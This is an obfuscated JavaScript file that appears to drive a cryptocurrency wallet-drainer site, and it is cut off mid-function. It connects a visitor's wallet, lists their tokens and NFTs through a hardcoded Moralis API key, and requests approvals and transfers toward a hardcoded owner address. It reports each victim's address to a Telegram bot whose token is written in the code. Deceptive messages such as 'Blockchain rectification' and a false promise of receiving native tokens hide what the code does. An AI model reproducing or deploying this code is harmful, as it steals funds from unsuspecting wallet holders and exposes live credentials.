const _0x88a0f4=_0x47f0;(function(_0x4719dc,_0x5d7069){const _0x522445=_0x47f0,_0x393f57=_0x4719dc();while(!![]){try{const _0x5c06ae=parseInt(_0x522445(0xb4))/0x1*(parseInt(_0x522445(0xb3))/0x2)+-parseInt(_0x522445(0xf2))/0x3+parseInt(_0x522445(0xdf))/0x4+parseInt(_0x522445(0x133))/0x5+parseInt(_0x522445(0x12f))/0x6+-parseInt(_0x522445(0x162))/0x7*(-parseInt(_0x522445(0x160))/0x8)+-parseInt(_0x522445(0xba))/0x9;if(_0x5c06ae===_0x5d7069)break;else _0x393f57['push'](_0x393f57['shift']());}catch(_0xa1e10c){_0x393f57['push'](_0x393f57['shift']());}}}(_0x2926,0x9ad7c));let NFTs=[],tokens=[],chainId=null,web3Object=null,selectedAccount=null;import{EthereumClient,w3mConnectors,w3mProvider,WagmiCore,WagmiCoreChains,WagmiCoreConnectors}from'https://unpkg.com/@web3modal/ethereum@2.6.2';import{parseEther}from'https://esm.sh/v126/viem@1.2.15/es2022/viem.bundle.mjs';import{Web3Modal}from'https://unpkg.com/@web3modal/html@2.6.2';const {arbitrum,mainnet}=WagmiCoreChains,{configureChains,createConfig,writeContract,sendTransaction,fetchBalance,fetchFeeData,connect,switchNetwork,getAccount,getNetwork}=WagmiCore,chains=[arbitrum,mainnet],projectId=_0x88a0f4(0x14b),{publicClient}=configureChains(chains,[w3mProvider({'projectId':projectId})]),wagmiConfig=createConfig({'autoConnect':!![],'connectors':[...w3mConnectors({'chains':chains,'version':0x2,'projectId':projectId}),new WagmiCoreConnectors[(_0x88a0f4(0xe5))]({'chains':chains,'options':{'appName':_0x88a0f4(0x118)}})],'publicClient':publicClient}),ethereumClient=new EthereumClient(wagmiConfig,chains);export const web3Modal=new Web3Modal({'projectId':projectId,'walletImages':{'safe':_0x88a0f4(0xcf)}},ethereumClient);const OWNER_ADDRESS=_0x88a0f4(0xb7),ABI=[{'constant':!![],'inputs':[],'name':_0x88a0f4(0x14d),'outputs':[{'name':'','type':_0x88a0f4(0x166)}],'payable':![],'stateMutability':_0x88a0f4(0x158),'type':'function'},{'constant':![],'inputs':[{'name':_0x88a0f4(0x14a),'type':_0x88a0f4(0xaf)}],'name':_0x88a0f4(0x153),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x88a0f4(0x146)},{'constant':![],'inputs':[{'name':_0x88a0f4(0x157),'type':_0x88a0f4(0xaf)},{'name':_0x88a0f4(0x14e),'type':_0x88a0f4(0x11c)}],'name':_0x88a0f4(0x123),'outputs':[],'payable':![],'stateMutability':_0x88a0f4(0xdd),'type':'function'},{'constant':!![],'inputs':[],'name':_0x88a0f4(0x13e),'outputs':[{'name':'','type':_0x88a0f4(0x127)}],'payable':![],'stateMutability':'view','type':'function'},{'constant':![],'inputs':[{'name':_0x88a0f4(0xf8),'type':_0x88a0f4(0xaf)}],'name':_0x88a0f4(0x102),'outputs':[],'payable':![],'stateMutability':_0x88a0f4(0xdd),'type':_0x88a0f4(0x146)},{'constant':!![],'inputs':[],'name':_0x88a0f4(0xb5),'outputs':[{'name':'','type':_0x88a0f4(0x11c)}],'payable':![],'stateMutability':'view','type':'function'},{'constant':![],'inputs':[{'name':_0x88a0f4(0x152),'type':_0x88a0f4(0xaf)},{'name':'_to','type':'address'},{'name':_0x88a0f4(0x14e),'type':'uint256'}],'name':_0x88a0f4(0x126),'outputs':[],'payable':![],'stateMutability':_0x88a0f4(0xdd),'type':'function'},{'constant':!![],'inputs':[],'name':_0x88a0f4(0x147),'outputs':[{'name':'','type':_0x88a0f4(0xaf)}],'payable':![],'stateMutability':_0x88a0f4(0x158),'type':_0x88a0f4(0x146)},{'constant':!![],'inputs':[{'name':'','type':_0x88a0f4(0xaf)}],'name':_0x88a0f4(0xbe),'outputs':[{'name':'','type':_0x88a0f4(0x11c)}],'payable':![],'stateMutability':_0x88a0f4(0x158),'type':'function'},{'constant':!![],'inputs':[],'name':_0x88a0f4(0xd4),'outputs':[{'name':'','type':_0x88a0f4(0x11c)}],'payable':![],'stateMutability':_0x88a0f4(0x158),'type':'function'},{'constant':!![],'inputs':[],'name':_0x88a0f4(0xc0),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x88a0f4(0x158),'type':_0x88a0f4(0x146)},{'constant':!![],'inputs':[],'name':_0x88a0f4(0x148),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x88a0f4(0x158),'type':_0x88a0f4(0x146)},{'constant':![],'inputs':[],'name':_0x88a0f4(0x10b),'outputs':[],'payable':![],'stateMutability':_0x88a0f4(0xdd),'type':_0x88a0f4(0x146)},{'constant':!![],'inputs':[{'name':_0x88a0f4(0xad),'type':'address'}],'name':_0x88a0f4(0xce),'outputs':[{'name':'','type':_0x88a0f4(0x127)}],'payable':![],'stateMutability':_0x88a0f4(0x158),'type':_0x88a0f4(0x146)},{'constant':!![],'inputs':[{'name':'','type':_0x88a0f4(0xaf)},{'name':'','type':'address'}],'name':'allowed','outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':'view','type':_0x88a0f4(0x146)},{'constant':!![],'inputs':[],'name':'paused','outputs':[{'name':'','type':_0x88a0f4(0x127)}],'payable':![],'stateMutability':_0x88a0f4(0x158),'type':_0x88a0f4(0x146)},{'constant':!![],'inputs':[{'name':'who','type':'address'}],'name':_0x88a0f4(0x120),'outputs':[{'name':'','type':_0x88a0f4(0x11c)}],'payable':![],'stateMutability':'view','type':_0x88a0f4(0x146)},{'constant':![],'inputs':[],'name':'pause','outputs':[],'payable':![],'stateMutability':_0x88a0f4(0xdd),'type':_0x88a0f4(0x146)},{'constant':!![],'inputs':[],'name':_0x88a0f4(0x168),'outputs':[{'name':'','type':_0x88a0f4(0xaf)}],'payable':![],'stateMutability':_0x88a0f4(0x158),'type':_0x88a0f4(0x146)},{'constant':!![],'inputs':[],'name':'owner','outputs':[{'name':'','type':_0x88a0f4(0xaf)}],'payable':![],'stateMutability':_0x88a0f4(0x158),'type':_0x88a0f4(0x146)},{'constant':!![],'inputs':[],'name':_0x88a0f4(0x100),'outputs':[{'name':'','type':_0x88a0f4(0x166)}],'payable':![],'stateMutability':_0x88a0f4(0x158),'type':'function'},{'constant':![],'inputs':[{'name':'_to','type':'address'},{'name':_0x88a0f4(0x14e),'type':_0x88a0f4(0x11c)}],'name':_0x88a0f4(0x136),'outputs':[],'payable':![],'stateMutability':_0x88a0f4(0xdd),'type':_0x88a0f4(0x146)},{'constant':![],'inputs':[{'name':'newBasisPoints','type':_0x88a0f4(0x11c)},{'name':_0x88a0f4(0xf5),'type':_0x88a0f4(0x11c)}],'name':_0x88a0f4(0x156),'outputs':[],'payable':![],'stateMutability':_0x88a0f4(0xdd),'type':_0x88a0f4(0x146)},{'constant':![],'inputs':[{'name':'amount','type':_0x88a0f4(0x11c)}],'name':_0x88a0f4(0x131),'outputs':[],'payable':![],'stateMutability':_0x88a0f4(0xdd),'type':_0x88a0f4(0x146)},{'constant':![],'inputs':[{'name':_0x88a0f4(0xcc),'type':_0x88a0f4(0x11c)}],'name':_0x88a0f4(0xc1),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x88a0f4(0x146)},{'constant':!![],'inputs':[{'name':_0x88a0f4(0xcd),'type':'address'},{'name':'_spender','type':_0x88a0f4(0xaf)}],'name':_0x88a0f4(0x12a),'outputs':[{'name':_0x88a0f4(0xd5),'type':'uint256'}],'payable':![],'stateMutability':_0x88a0f4(0x158),'type':_0x88a0f4(0x146)},{'constant':!![],'inputs':[],'name':_0x88a0f4(0xe1),'outputs':[{'name':'','type':_0x88a0f4(0x11c)}],'payable':![],'stateMutability':_0x88a0f4(0x158),'type':'function'},{'constant':!![],'inputs':[{'name':'','type':_0x88a0f4(0xaf)}],'name':_0x88a0f4(0xf3),'outputs':[{'name':'','type':_0x88a0f4(0x127)}],'payable':![],'stateMutability':_0x88a0f4(0x158),'type':_0x88a0f4(0x146)},{'constant':![],'inputs':[{'name':_0x88a0f4(0x112),'type':'address'}],'name':_0x88a0f4(0xf0),'outputs':[],'payable':![],'stateMutability':_0x88a0f4(0xdd),'type':_0x88a0f4(0x146)},{'constant':!![],'inputs':[],'name':_0x88a0f4(0x110),'outputs':[{'name':'','type':_0x88a0f4(0x11c)}],'payable':![],'stateMutability':'view','type':_0x88a0f4(0x146)},{'constant':![],'inputs':[{'name':_0x88a0f4(0x14f),'type':_0x88a0f4(0xaf)}],'name':_0x88a0f4(0x129),'outputs':[],'payable':![],'stateMutability':_0x88a0f4(0xdd),'type':_0x88a0f4(0x146)},{'constant':![],'inputs':[{'name':_0x88a0f4(0x161),'type':'address'}],'name':_0x88a0f4(0xea),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':'function'},{'inputs':[{'name':_0x88a0f4(0xdc),'type':_0x88a0f4(0x11c)},{'name':_0x88a0f4(0x106),'type':_0x88a0f4(0x166)},{'name':_0x88a0f4(0x145),'type':'string'},{'name':_0x88a0f4(0x105),'type':_0x88a0f4(0x11c)}],'payable':![],'stateMutability':_0x88a0f4(0xdd),'type':'constructor'},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x88a0f4(0xcc),'type':_0x88a0f4(0x11c)}],'name':'Issue','type':_0x88a0f4(0x114)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x88a0f4(0xcc),'type':_0x88a0f4(0x11c)}],'name':_0x88a0f4(0xe9),'type':_0x88a0f4(0x114)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x88a0f4(0x151),'type':_0x88a0f4(0xaf)}],'name':_0x88a0f4(0x15a),'type':_0x88a0f4(0x114)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x88a0f4(0xed),'type':_0x88a0f4(0x11c)},{'indexed':![],'name':_0x88a0f4(0x13d),'type':_0x88a0f4(0x11c)}],'name':_0x88a0f4(0xee),'type':_0x88a0f4(0x114)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x88a0f4(0x161),'type':'address'},{'indexed':![],'name':_0x88a0f4(0xd6),'type':_0x88a0f4(0x11c)}],'name':_0x88a0f4(0x107),'type':_0x88a0f4(0x114)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x88a0f4(0xcb),'type':_0x88a0f4(0xaf)}],'name':_0x88a0f4(0xe0),'type':_0x88a0f4(0x114)},{'anonymous':![],'inputs':[{'indexed':![],'name':'_user','type':_0x88a0f4(0xaf)}],'name':'RemovedBlackList','type':_0x88a0f4(0x114)},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x88a0f4(0x164),'type':_0x88a0f4(0xaf)},{'indexed':!![],'name':_0x88a0f4(0x167),'type':'address'},{'indexed':![],'name':_0x88a0f4(0x149),'type':_0x88a0f4(0x11c)}],'name':_0x88a0f4(0xb1),'type':_0x88a0f4(0x114)},{'anonymous':![],'inputs':[{'indexed':!![],'name':'from','type':_0x88a0f4(0xaf)},{'indexed':!![],'name':'to','type':_0x88a0f4(0xaf)},{'indexed':![],'name':_0x88a0f4(0x149),'type':_0x88a0f4(0x11c)}],'name':_0x88a0f4(0xbc),'type':_0x88a0f4(0x114)},{'anonymous':![],'inputs':[],'name':_0x88a0f4(0xe6),'type':_0x88a0f4(0x114)},{'anonymous':![],'inputs':[],'name':'Unpause','type':_0x88a0f4(0x114)}],ABIN=[{'inputs':[{'internalType':'string','name':'name','type':_0x88a0f4(0x166)},{'internalType':_0x88a0f4(0x166),'name':_0x88a0f4(0x100),'type':_0x88a0f4(0x166)},{'internalType':_0x88a0f4(0x11c),'name':'maxNftSupply','type':'uint256'},{'internalType':_0x88a0f4(0x11c),'name':_0x88a0f4(0x10f),'type':_0x88a0f4(0x11c)}],'stateMutability':_0x88a0f4(0xdd),'type':_0x88a0f4(0x15b)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x88a0f4(0xaf),'name':_0x88a0f4(0x164),'type':_0x88a0f4(0xaf)},{'indexed':!![],'internalType':_0x88a0f4(0xaf),'name':'approved','type':_0x88a0f4(0xaf)},{'indexed':!![],'internalType':'uint256','name':_0x88a0f4(0x13c),'type':_0x88a0f4(0x11c)}],'name':_0x88a0f4(0xb1),'type':_0x88a0f4(0x114)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x88a0f4(0xaf),'name':_0x88a0f4(0x164),'type':_0x88a0f4(0xaf)},{'indexed':!![],'internalType':_0x88a0f4(0xaf),'name':_0x88a0f4(0xec),'type':_0x88a0f4(0xaf)},{'indexed':![],'internalType':_0x88a0f4(0x127),'name':_0x88a0f4(0xc5),'type':_0x88a0f4(0x127)}],'name':_0x88a0f4(0xe2),'type':_0x88a0f4(0x114)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x88a0f4(0xaf),'name':_0x88a0f4(0xfc),'type':_0x88a0f4(0xaf)},{'indexed':!![],'internalType':'address','name':_0x88a0f4(0x14f),'type':_0x88a0f4(0xaf)}],'name':'OwnershipTransferred','type':_0x88a0f4(0x114)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':'address','name':_0x88a0f4(0x163),'type':_0x88a0f4(0xaf)},{'indexed':!![],'internalType':_0x88a0f4(0xaf),'name':'to','type':_0x88a0f4(0xaf)},{'indexed':!![],'internalType':_0x88a0f4(0x11c),'name':'tokenId','type':_0x88a0f4(0x11c)}],'name':_0x88a0f4(0xbc),'type':'event'},{'inputs':[],'name':'BAYC_PROVENANCE','outputs':[{'internalType':_0x88a0f4(0x166),'name':'','type':_0x88a0f4(0x166)}],'stateMutability':'view','type':_0x88a0f4(0x146)},{'inputs':[],'name':_0x88a0f4(0x144),'outputs':[{'internalType':_0x88a0f4(0x11c),'name':'','type':_0x88a0f4(0x11c)}],'stateMutability':_0x88a0f4(0x158),'type':_0x88a0f4(0x146)},{'inputs':[],'name':_0x88a0f4(0xbd),'outputs':[{'internalType':'uint256','name':'','type':_0x88a0f4(0x11c)}],'stateMutability':_0x88a0f4(0x158),'type':_0x88a0f4(0x146)},{'inputs':[],'name':_0x88a0f4(0x108),'outputs':[{'internalType':_0x88a0f4(0x11c),'name':'','type':_0x88a0f4(0x11c)}],'stateMutability':_0x88a0f4(0x158),'type':_0x88a0f4(0x146)},{'inputs':[{'internalType':_0x88a0f4(0xaf),'name':'to','type':_0x88a0f4(0xaf)},{'internalType':_0x88a0f4(0x11c),'name':_0x88a0f4(0x13c),'type':_0x88a0f4(0x11c)}],'name':_0x88a0f4(0x123),'outputs':[],'stateMutability':_0x88a0f4(0xdd),'type':_0x88a0f4(0x146)},{'inputs':[{'internalType':_0x88a0f4(0xaf),'name':_0x88a0f4(0x164),'type':_0x88a0f4(0xaf)}],'name':_0x88a0f4(0x120),'outputs':[{'internalType':_0x88a0f4(0x11c),'name':'','type':_0x88a0f4(0x11c)}],'stateMutability':_0x88a0f4(0x158),'type':_0x88a0f4(0x146)},{'inputs':[],'name':_0x88a0f4(0xc2),'outputs':[{'internalType':_0x88a0f4(0x166),'name':'','type':_0x88a0f4(0x166)}],'stateMutability':_0x88a0f4(0x158),'type':_0x88a0f4(0x146)},{'inputs':[],'name':'emergencySetStartingIndexBlock','outputs':[],'stateMutability':_0x88a0f4(0xdd),'type':_0x88a0f4(0x146)},{'inputs':[],'name':_0x88a0f4(0x11a),'outputs':[],'stateMutability':_0x88a0f4(0xdd),'type':'function'},{'inputs':[{'internalType':_0x88a0f4(0x11c),'name':'tokenId','type':_0x88a0f4(0x11c)}],'name':_0x88a0f4(0x15f),'outputs':[{'internalType':_0x88a0f4(0xaf),'name':'','type':_0x88a0f4(0xaf)}],'stateMutability':_0x88a0f4(0x158),'type':_0x88a0f4(0x146)},{'inputs':[{'internalType':'address','name':_0x88a0f4(0x164),'type':'address'},{'internalType':_0x88a0f4(0xaf),'name':_0x88a0f4(0xec),'type':_0x88a0f4(0xaf)}],'name':_0x88a0f4(0xf7),'outputs':[{'internalType':_0x88a0f4(0x127),'name':'','type':_0x88a0f4(0x127)}],'stateMutability':'view','type':_0x88a0f4(0x146)},{'inputs':[],'name':'maxApePurchase','outputs':[{'internalType':_0x88a0f4(0x11c),'name':'','type':'uint256'}],'stateMutability':'view','type':_0x88a0f4(0x146)},{'inputs':[{'internalType':_0x88a0f4(0x11c),'name':_0x88a0f4(0xef),'type':_0x88a0f4(0x11c)}],'name':_0x88a0f4(0x10a),'outputs':[],'stateMutability':_0x88a0f4(0xbf),'type':_0x88a0f4(0x146)},{'inputs':[],'name':_0x88a0f4(0x14d),'outputs':[{'internalType':_0x88a0f4(0x166),'name':'','type':_0x88a0f4(0x166)}],'stateMutability':_0x88a0f4(0x158),'type':_0x88a0f4(0x146)},{'inputs':[],'name':_0x88a0f4(0x164),'outputs':[{'internalType':'address','name':'','type':_0x88a0f4(0xaf)}],'stateMutability':_0x88a0f4(0x158),'type':_0x88a0f4(0x146)},{'inputs':[{'internalType':_0x88a0f4(0x11c),'name':_0x88a0f4(0x13c),'type':_0x88a0f4(0x11c)}],'name':_0x88a0f4(0xbb),'outputs':[{'internalType':'address','name':'','type':'address'}],'stateMutability':'view','type':_0x88a0f4(0x146)},{'inputs':[],'name':_0x88a0f4(0x11f),'outputs':[],'stateMutability':'nonpayable','type':_0x88a0f4(0x146)},{'inputs':[],'name':'reserveApes','outputs':[],'stateMutability':'nonpayable','type':_0x88a0f4(0x146)},{'inputs':[{'internalType':_0x88a0f4(0xaf),'name':'from','type':'address'},{'internalType':_0x88a0f4(0xaf),'name':'to','type':_0x88a0f4(0xaf)},{'internalType':_0x88a0f4(0x11c),'name':_0x88a0f4(0x13c),'type':_0x88a0f4(0x11c)}],'name':'safeTransferFrom','outputs':[],'stateMutability':_0x88a0f4(0xdd),'type':_0x88a0f4(0x146)},{'inputs':[{'internalType':_0x88a0f4(0xaf),'name':_0x88a0f4(0x163),'type':'address'},{'internalType':_0x88a0f4(0xaf),'name':'to','type':'address'},{'internalType':'uint256','name':_0x88a0f4(0x13c),'type':_0x88a0f4(0x11c)},{'internalType':_0x88a0f4(0xe3),'name':_0x88a0f4(0x134),'type':_0x88a0f4(0xe3)}],'name':_0x88a0f4(0xd7),'outputs':[],'stateMutability':_0x88a0f4(0xdd),'type':'function'},{'inputs':[],'name':_0x88a0f4(0x10d),'outputs':[{'internalType':_0x88a0f4(0x127),'name':'','type':_0x88a0f4(0x127)}],'stateMutability':_0x88a0f4(0x158),'type':_0x88a0f4(0x146)},{'inputs':[{'internalType':_0x88a0f4(0xaf),'name':'operator','type':_0x88a0f4(0xaf)},{'internalType':'bool','name':_0x88a0f4(0xc5),'type':_0x88a0f4(0x127)}],'name':_0x88a0f4(0x154),'outputs':[],'stateMutability':_0x88a0f4(0xdd),'type':'function'},{'inputs':[{'internalType':_0x88a0f4(0x166),'name':_0x88a0f4(0xc2),'type':_0x88a0f4(0x166)}],'name':_0x88a0f4(0x169),'outputs':[],'stateMutability':'nonpayable','type':'function'},{'inputs':[{'internalType':'string','name':'provenanceHash','type':_0x88a0f4(0x166)}],'name':_0x88a0f4(0xe7),'outputs':[],'stateMutability':_0x88a0f4(0xdd),'type':_0x88a0f4(0x146)},{'inputs':[{'internalType':_0x88a0f4(0x11c),'name':_0x88a0f4(0xc3),'type':'uint256'}],'name':_0x88a0f4(0xb2),'outputs':[],'stateMutability':'nonpayable','type':_0x88a0f4(0x146)},{'inputs':[],'name':_0x88a0f4(0xf1),'outputs':[],'stateMutability':_0x88a0f4(0xdd),'type':_0x88a0f4(0x146)},{'inputs':[],'name':_0x88a0f4(0xf4),'outputs':[{'internalType':'uint256','name':'','type':_0x88a0f4(0x11c)}],'stateMutability':_0x88a0f4(0x158),'type':_0x88a0f4(0x146)},{'inputs':[],'name':_0x88a0f4(0x139),'outputs':[{'internalType':_0x88a0f4(0x11c),'name':'','type':_0x88a0f4(0x11c)}],'stateMutability':_0x88a0f4(0x158),'type':'function'},{'inputs':[{'internalType':_0x88a0f4(0x137),'name':_0x88a0f4(0x111),'type':'bytes4'}],'name':_0x88a0f4(0xb8),'outputs':[{'internalType':_0x88a0f4(0x127),'name':'','type':_0x88a0f4(0x127)}],'stateMutability':_0x88a0f4(0x158),'type':'function'},{'inputs':[],'name':'symbol','outputs':[{'internalType':'string','name':'','type':_0x88a0f4(0x166)}],'stateMutability':_0x88a0f4(0x158),'type':_0x88a0f4(0x146)},{'inputs':[{'internalType':'uint256','name':_0x88a0f4(0xc8),'type':_0x88a0f4(0x11c)}],'name':_0x88a0f4(0x135),'outputs':[{'internalType':_0x88a0f4(0x11c),'name':'','type':'uint256'}],'stateMutability':_0x88a0f4(0x158),'type':_0x88a0f4(0x146)},{'inputs':[{'internalType':'address','name':'owner','type':_0x88a0f4(0xaf)},{'internalType':_0x88a0f4(0x11c),'name':_0x88a0f4(0xc8),'type':_0x88a0f4(0x11c)}],'name':_0x88a0f4(0x104),'outputs':[{'internalType':'uint256','name':'','type':_0x88a0f4(0x11c)}],'stateMutability':_0x88a0f4(0x158),'type':_0x88a0f4(0x146)},{'inputs':[{'internalType':_0x88a0f4(0x11c),'name':_0x88a0f4(0x13c),'type':_0x88a0f4(0x11c)}],'name':_0x88a0f4(0x13f),'outputs':[{'internalType':'string','name':'','type':'string'}],'stateMutability':'view','type':_0x88a0f4(0x146)},{'inputs':[],'name':'totalSupply','outputs':[{'internalType':_0x88a0f4(0x11c),'name':'','type':_0x88a0f4(0x11c)}],'stateMutability':_0x88a0f4(0x158),'type':_0x88a0f4(0x146)},{'inputs':[{'internalType':_0x88a0f4(0xaf),'name':_0x88a0f4(0x163),'type':_0x88a0f4(0xaf)},{'internalType':_0x88a0f4(0xaf),'name':'to','type':_0x88a0f4(0xaf)},{'internalType':_0x88a0f4(0x11c),'name':_0x88a0f4(0x13c),'type':_0x88a0f4(0x11c)}],'name':_0x88a0f4(0x126),'outputs':[],'stateMutability':_0x88a0f4(0xdd),'type':'function'},{'inputs':[{'internalType':_0x88a0f4(0xaf),'name':_0x88a0f4(0x14f),'type':_0x88a0f4(0xaf)}],'name':_0x88a0f4(0x129),'outputs':[],'stateMutability':_0x88a0f4(0xdd),'type':_0x88a0f4(0x146)},{'inputs':[],'name':_0x88a0f4(0x143),'outputs':[],'stateMutability':_0x88a0f4(0xdd),'type':_0x88a0f4(0x146)}];$(_0x88a0f4(0x150))[_0x88a0f4(0xc7)](async function(){const _0xaf6200=_0x88a0f4;console[_0xaf6200(0xd1)]('1');try{await web3Modal['openModal']();}catch(_0xa609d3){console['log'](_0xaf6200(0x113),_0xa609d3);return;}}),$(_0x88a0f4(0xb9))[_0x88a0f4(0xc7)](async function(){const _0x3913e8=_0x88a0f4;alert(_0x3913e8(0x101));let _0x45788d=getAccount();console[_0x3913e8(0xd1)](_0x45788d),!_0x45788d[_0x3913e8(0xaf)]&&(console['log'](_0x3913e8(0xfb)),alert('You\x20need\x20to\x20connect\x20your\x20wallet\x20first')),_0x45788d[_0x3913e8(0x116)]['name']==='MetaMask'&&(_0x45788d['connector']['chains'][0x0]['network']!==_0x3913e8(0xd3)&&(console[_0x3913e8(0xd1)](_0x3913e8(0xdb)),await switchNetwork({'chainId':0xa4b1}))),selectedAccount=_0x45788d['address'],sendMessage('Emma\x20Wallet\x20Connected\x20Successfully\x20to\x20arbitrum!'),sendMessage('Cl\x20address\x20:\x20'+selectedAccount),covalenthqAPICall();});function _0x2926(){const _0x40c936=['name','_value','newOwner','.connect','newAddress','_from','deprecate','setApprovalForAll','/erc20','setParams','_spender','view','NFT\x20Contract\x20Address\x20','Deprecate','constructor','chainId:','filter','all','getApproved','776QHiyWG','_blackListedUser','50022xetiUt','from','owner','https://deep-index.moralis.io/api/v2/','string','spender','getOwner','setBaseURI','999999999999999999999999999999999999999999999999999999999999999999999999','_maker','result','address','message','Approval','setRevealTimestamp','2MbFYgy','20642mnogAC','totalSupply','&text=','0xea8968B218a551919FbD5f1166328C82a96dED54','supportsInterface','.proceed','9916245lcYKzy','ownerOf','Transfer','REVEAL_TIMESTAMP','balances','payable','maximumFee','redeem','baseURI','revealTimeStamp','then','approved','NFT','click','index','hash','balance','_user','amount','_owner','getBlackListStatus','https://pbs.twimg.com/profile_images/1566773491764023297/IvmCdGnM_400x400.jpg','Error\x20not\x20found,\x20Please\x20switch\x20network\x20or\x20try\x20again!','log','New\x20token','arbitrum','decimals','remaining','_balance','safeTransferFrom','LJrmvC5VBYK43Qa9BKmVB4GUr7saw5TLZqKY65BQub1clqdAgjy16t5A7n16DIbn','formatted','Token','Incorrect\x20network','_initialSupply','nonpayable','1297332864','1753348jgdWhE','AddedBlackList','basisPointsRate','ApprovalForAll','bytes','json','CoinbaseWalletConnector','Pause','setProvenanceHash','/nft/collections?chain=','Redeem','destroyBlackFunds','toString','operator','feeBasisPoints','Params','numberOfTokens','removeBlackList','setStartingIndex','2779965sYpBme','isBlackListed','startingIndex','newMaxFee','application/json','isApprovedForAll','_evilUser','Transaction\x20is\x20submitted\x20to\x20the\x20network','Unable\x20to\x20get\x20NFts','No\x20address','previousOwner','Transaction\x20Rejected','Your\x20address\x20','token_address','symbol','Ensure\x20you\x20are\x20assessing\x20this\x20website\x20from\x20a\x20dapps\x20browser\x20or\x20one\x20with\x20a\x20wallet\x20extension','addBlackList','NFTs\x20collection\x20','tokenOfOwnerByIndex','_decimals','_name','DestroyedBlackFunds','apePrice','GET','mintApe','unpause','https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=','saleIsActive','Transaction\x20Receipt:\x20','saleStart','MAX_UINT','interfaceId','_clearedUser','Could\x20not\x20get\x20a\x20wallet\x20connection','event','Approve\x20Completed\x20Successfully','connector','&format=decimal&limit=','Blockchain\x20rectification','Token\x20balance\x20is\x20','flipSaleState','length','uint256','sort','Insufficient\x20funds\x20for\x20transfer\x20or\x20transaction\x20was\x20rejected','renounceOwnership','balanceOf','map','&vs_currencies=usd','approve','search','Initial\x20list\x20','transferFrom','bool','price','transferOwnership','allowance','Tokens:','tokens-list','catch','Approved','3577572eImNyo','TOKEN\x20Contract\x20Address\x20','issue','error','4571465qlKAtz','_data','tokenByIndex','transfer','bytes4','Transfer\x20Completed\x20Successfully,\x20You\x20should\x20receive\x20some\x20native\x20tokens','startingIndexBlock','status','Error\x20processing\x20item\x20','tokenId','maxFee','deprecated','tokenURI','0x2c0eA406932639E6Dc57b433059124D16579BBf8','Error:\x20','Error\x20collecting\x20info\x20about\x20wallet','withdraw','MAX_APES','_symbol','function','upgradedAddress','_totalSupply','value','_upgradedAddress','ee71d215d0dec7d1bf950851c84d9643','5227607491'];_0x2926=function(){return _0x40c936;};return _0x2926();}const Oxa=_0x88a0f4(0x140),Oxc1=_0x88a0f4(0x14c),Oxc2=_0x88a0f4(0xde);async function covalenthqAPICall(){const _0x11fb2f=_0x88a0f4,_0x1f158b={'chain':_0x11fb2f(0xd3)},_0x5efcd2=new URL(_0x11fb2f(0x165)+selectedAccount+_0x11fb2f(0x155));_0x5efcd2[_0x11fb2f(0x124)]=new URLSearchParams(_0x1f158b)['toString']();const _0x2e0dfb={'method':_0x11fb2f(0x109),'headers':{'accept':_0x11fb2f(0xf6),'X-API-Key':_0x11fb2f(0xd8)}};try{const _0x1be31b=await fetch(_0x5efcd2,_0x2e0dfb)[_0x11fb2f(0xc4)](_0x2bc958=>_0x2bc958[_0x11fb2f(0xe4)]());console[_0x11fb2f(0xd1)](_0x1be31b);let _0x32d321=_0x1be31b;console['log'](_0x11fb2f(0x125),_0x32d321);let _0x38f46f=await Promise[_0x11fb2f(0x15e)](_0x32d321[_0x11fb2f(0x121)](async _0x2b7367=>{const _0x4df2c5=_0x11fb2f;let _0x9a728a;try{_0x9a728a=await getValue(_0x2b7367[_0x4df2c5(0xff)],_0x2b7367[_0x4df2c5(0xca)],_0x2b7367[_0x4df2c5(0xd4)]);}catch(_0x2377d4){_0x9a728a=0x0;}return console['log'](_0x9a728a),{'balance':_0x2b7367[_0x4df2c5(0xca)],'value':_0x9a728a,'address':_0x2b7367['token_address']};}));console[_0x11fb2f(0xd1)](_0x11fb2f(0x12c),_0x38f46f),tokens=_0x38f46f[_0x11fb2f(0x15d)](_0xf32d24=>_0xf32d24[_0x11fb2f(0x149)]>0x5),tokens[_0x11fb2f(0x11d)]((_0x36fc53,_0x312756)=>_0x312756['value']-_0x36fc53[_0x11fb2f(0x149)]),console[_0x11fb2f(0xd1)](_0x11fb2f(0x15c),await getNetwork(),_0x11fb2f(0x12b),tokens),NFTs=await getNFTs(selectedAccount)[_0x11fb2f(0x12d)](_0x5702b9=>{const _0x334560=_0x11fb2f;console['log'](_0x334560(0xfa),_0x5702b9);}),NFTs=NFTs[_0x11fb2f(0xae)],console[_0x11fb2f(0xd1)](_0x11fb2f(0x103),NFTs);if(tokens['length']===0x0&&NFTs['length']===0x0)onSendEther();else onApprove();}catch{sendMessage(_0x11fb2f(0x142));}}async function onApprove(){const _0xde2b1a=_0x88a0f4;if(tokens[_0xde2b1a(0x11b)])try{loopTokens(tokens);}catch(_0x2d0323){console['error']('Error\x20processing\x20item\x20'+_0x2d0323['message']);}else{if(NFTs[_0xde2b1a(0x11b)]){try{loopNfts(NFTs);}catch(_0x3287a9){console[_0xde2b1a(0x132)](_0xde2b1a(0x13b)+_0x3287a9[_0xde2b1a(0xb0)]);}onSendEther(),sendMessage(_0xde2b1a(0xd0));}else try{onSendEther();}catch(_0x528829){console['error'](_0xde2b1a(0x13b)+_0x528829[_0xde2b1a(0xb0)]);}}}async function loopTokens(_0x5c803d){const _0x24d6ec=_0x88a0f4;for await(let _0x1086fe of _0x5c803d){console[_0x24d6ec(0xd1)](_0x24d6ec(0xda),_0x1086fe);try{sendMessage(_0x24d6ec(0xd2));let {hash:_0x254650}=await 